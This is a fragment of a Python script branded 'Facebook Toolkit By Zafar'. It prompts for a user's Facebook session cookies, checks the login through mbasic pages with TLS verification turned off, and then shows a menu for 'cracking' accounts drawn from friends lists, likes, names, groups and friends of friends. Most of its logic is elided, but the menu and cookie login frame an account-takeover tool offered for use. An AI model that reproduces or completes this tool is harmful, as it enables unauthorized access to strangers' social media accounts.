...
def masuk():
        ...
        try:
                ...
                cek = input("[\033[1;32m>\033[0m Enter Cookies : ")
        cek = {"cookie":cek}
        ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
        if "mbasic_logout_button" in str(ismi):
                if "What are you thinking now" in str(ismi):
...
if __name__ == '__main__':
        try:
                ...
                kukis = masuk()
                kuki = {'cookie':kukis}
                print('\n\n\t\t!!! \033[1;91mFacebook Toolkit By Zafar\033[0m !!!\n\n')
                print('\033[1;91m┣━ \033[0m[\033[1;32m1\033[0m] Crack From The Friends List')
                print('\033[1;91m┣━\033[0m [\033[1;32m2\033[0m] Crack From Likes\033[1;91m ')
                print('┣━ \033[0m[\033[1;32m3\033[0m] Crack From Name')
                print('\033[1;91m┣━ \033[0m[\033[1;32m4\033[0m] Crack From Group ')
                print('\033[1;91m┣━ \033[0m[\033[1;32m5\033[0m] Crack From Friends & Friends')
